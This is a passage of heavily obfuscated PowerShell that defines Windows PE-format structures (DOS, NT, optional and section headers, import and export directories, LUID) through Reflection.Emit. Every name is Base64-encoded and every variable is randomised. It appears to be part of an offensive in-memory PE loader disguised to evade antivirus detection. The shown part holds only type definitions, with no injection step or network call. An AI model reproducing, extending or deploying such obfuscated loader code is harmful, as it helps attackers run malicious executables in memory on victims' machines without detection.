		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AEkAbQBwAG8AcgB0AEQAZQBzAGMAcgBpAHAAdABvAHIA'))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(200) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAFIAUgB1AG4AdABpAG0AZQBIAGUAYQBkAGUAcgA='))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(208) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(216) | Out-Null
		${e477028429474836a493eb3455526dcd} = ${55580d7c42de426c918d2e3e90cfdb71}.CreateType()
		${e39002e42e324234be4b9268daddc239} | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value ${e477028429474836a493eb3455526dcd}
		${c53158141dae4be9bd10d0c075d6d390} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${55580d7c42de426c918d2e3e90cfdb71} = ${ee2479f604eb42af9bd823448f5f2d6a}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ASABFAEEARABFAFIAUwA2ADQA'))), ${c53158141dae4be9bd10d0c075d6d390}, [System.ValueType], 264)
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBIAGUAYQBkAGUAcgA='))), ${a03cb6013575431d83d70a231ebbe322}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), ${9eb905891e0e4c50a403fc63e0170ba5}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${95987039e09047738f7a34dc21a7fc82} = ${55580d7c42de426c918d2e3e90cfdb71}.CreateType()
		${e39002e42e324234be4b9268daddc239} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value ${95987039e09047738f7a34dc21a7fc82}
		${c53158141dae4be9bd10d0c075d6d390} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${55580d7c42de426c918d2e3e90cfdb71} = ${ee2479f604eb42af9bd823448f5f2d6a}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ASABFAEEARABFAFIAUwAzADIA'))), ${c53158141dae4be9bd10d0c075d6d390}, [System.ValueType], 248)
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBIAGUAYQBkAGUAcgA='))), ${a03cb6013575431d83d70a231ebbe322}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), ${e477028429474836a493eb3455526dcd}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${bdd7746a07484b1e9129d63e3975bdf8} = ${55580d7c42de426c918d2e3e90cfdb71}.CreateType()
		${e39002e42e324234be4b9268daddc239} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value ${bdd7746a07484b1e9129d63e3975bdf8}
		${c53158141dae4be9bd10d0c075d6d390} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${55580d7c42de426c918d2e3e90cfdb71} = ${ee2479f604eb42af9bd823448f5f2d6a}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABPAFMAXwBIAEUAQQBEAEUAUgA='))), ${c53158141dae4be9bd10d0c075d6d390}, [System.ValueType], 64)
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AYQBnAGkAYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAYgBsAHAA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcgBsAGMA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcABhAHIAaABkAHIA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AaQBuAGEAbABsAG8AYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AYQB4AGEAbABsAG8AYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHMAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHMAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcwB1AG0A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGkAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGwAZgBhAHIAbABjAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AdgBuAG8A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${bbaf0bbe146041cf9b19c13e9f8f85fb} = ${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHIAZQBzAA=='))), [UInt16[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${0e0d70571d6d4eceb3e7d215f4dc6e9c} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${39df646b0ea5436da824dee565efadd8} = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBDAG8AbgBzAHQA')))))
		${e0a826e236fb4dfeac2e0c8af2960bdb} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${e6827bef1af843d3a1fb47b744ac54bb}, ${0e0d70571d6d4eceb3e7d215f4dc6e9c}, ${39df646b0ea5436da824dee565efadd8}, @([Int32] 4))
		${bbaf0bbe146041cf9b19c13e9f8f85fb}.SetCustomAttribute(${e0a826e236fb4dfeac2e0c8af2960bdb})
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AZQBtAGkAZAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AZQBtAGkAbgBmAG8A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${bc90d7f7a9c746e7873ae6e5475dfed3} = ${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHIAZQBzADIA'))), [UInt16[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${0e0d70571d6d4eceb3e7d215f4dc6e9c} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${e0a826e236fb4dfeac2e0c8af2960bdb} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${e6827bef1af843d3a1fb47b744ac54bb}, ${0e0d70571d6d4eceb3e7d215f4dc6e9c}, ${39df646b0ea5436da824dee565efadd8}, @([Int32] 10))
		${bc90d7f7a9c746e7873ae6e5475dfed3}.SetCustomAttribute(${e0a826e236fb4dfeac2e0c8af2960bdb})
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGwAZgBhAG4AZQB3AA=='))), [Int32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${11da42e4834f4ccfb8bacc4de0affffd} = ${55580d7c42de426c918d2e3e90cfdb71}.CreateType()	
		${e39002e42e324234be4b9268daddc239} | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value ${11da42e4834f4ccfb8bacc4de0affffd}
		${c53158141dae4be9bd10d0c075d6d390} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${55580d7c42de426c918d2e3e90cfdb71} = ${ee2479f604eb42af9bd823448f5f2d6a}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBFAEMAVABJAE8ATgBfAEgARQBBAEQARQBSAA=='))), ${c53158141dae4be9bd10d0c075d6d390}, [System.ValueType], 40)
		${1218adae0752471cb2a6759f8bfb8ab5} = ${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [Char[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${0e0d70571d6d4eceb3e7d215f4dc6e9c} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${e0a826e236fb4dfeac2e0c8af2960bdb} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${e6827bef1af843d3a1fb47b744ac54bb}, ${0e0d70571d6d4eceb3e7d215f4dc6e9c}, ${39df646b0ea5436da824dee565efadd8}, @([Int32] 8))
		${1218adae0752471cb2a6759f8bfb8ab5}.SetCustomAttribute(${e0a826e236fb4dfeac2e0c8af2960bdb})
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABTAGkAegBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUgBhAHcARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBhAHcARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBlAGwAbwBjAGEAdABpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATABpAG4AZQBuAHUAbQBiAGUAcgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAZQBsAG8AYwBhAHQAaQBvAG4AcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAEwAaQBuAGUAbgB1AG0AYgBlAHIAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${843a0218eea845d998ea19ae08ca84a2} = ${55580d7c42de426c918d2e3e90cfdb71}.CreateType()
		${e39002e42e324234be4b9268daddc239} | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value ${843a0218eea845d998ea19ae08ca84a2}
		${c53158141dae4be9bd10d0c075d6d390} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${55580d7c42de426c918d2e3e90cfdb71} = ${ee2479f604eb42af9bd823448f5f2d6a}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AQgBBAFMARQBfAFIARQBMAE8AQwBBAFQASQBPAE4A'))), ${c53158141dae4be9bd10d0c075d6d390}, [System.ValueType], 8)
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQgBsAG8AYwBrAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${fa049838cd2e4892934e674af3346a4d} = ${55580d7c42de426c918d2e3e90cfdb71}.CreateType()
		${e39002e42e324234be4b9268daddc239} | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value ${fa049838cd2e4892934e674af3346a4d}
		${c53158141dae4be9bd10d0c075d6d390} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${55580d7c42de426c918d2e3e90cfdb71} = ${ee2479f604eb42af9bd823448f5f2d6a}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ASQBNAFAATwBSAFQAXwBEAEUAUwBDAFIASQBQAFQATwBSAA=='))), ${c53158141dae4be9bd10d0c075d6d390}, [System.ValueType], 20)
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAdwBhAHIAZABlAHIAQwBoAGEAaQBuAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAHIAcwB0AFQAaAB1AG4AawA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${86ed60e2af2c4e16974bcdde8d5ab8dd} = ${55580d7c42de426c918d2e3e90cfdb71}.CreateType()
		${e39002e42e324234be4b9268daddc239} | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value ${86ed60e2af2c4e16974bcdde8d5ab8dd}
		${c53158141dae4be9bd10d0c075d6d390} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${55580d7c42de426c918d2e3e90cfdb71} = ${ee2479f604eb42af9bd823448f5f2d6a}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARQBYAFAATwBSAFQAXwBEAEkAUgBFAEMAVABPAFIAWQA='))), ${c53158141dae4be9bd10d0c075d6d390}, [System.ValueType], 40)
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAEYAdQBuAGMAdABpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAE4AYQBtAGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARgB1AG4AYwB0AGkAbwBuAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYATgBhAG0AZQBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYATgBhAG0AZQBPAHIAZABpAG4AYQBsAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${c8086d44021849b4b47cffb63940cbaa} = ${55580d7c42de426c918d2e3e90cfdb71}.CreateType()
		${e39002e42e324234be4b9268daddc239} | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value ${c8086d44021849b4b47cffb63940cbaa}
		${c53158141dae4be9bd10d0c075d6d390} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${55580d7c42de426c918d2e3e90cfdb71} = ${ee2479f604eb42af9bd823448f5f2d6a}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARAA='))), ${c53158141dae4be9bd10d0c075d6d390}, [System.ValueType], 8)
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${ab85edbe2b604d979d7ef86780af9902} = ${55580d7c42de426c918d2e3e90cfdb71}.CreateType()
		${e39002e42e324234be4b9268daddc239} | Add-Member -MemberType NoteProperty -Name LUID -Value ${ab85edbe2b604d979d7ef86780af9902}
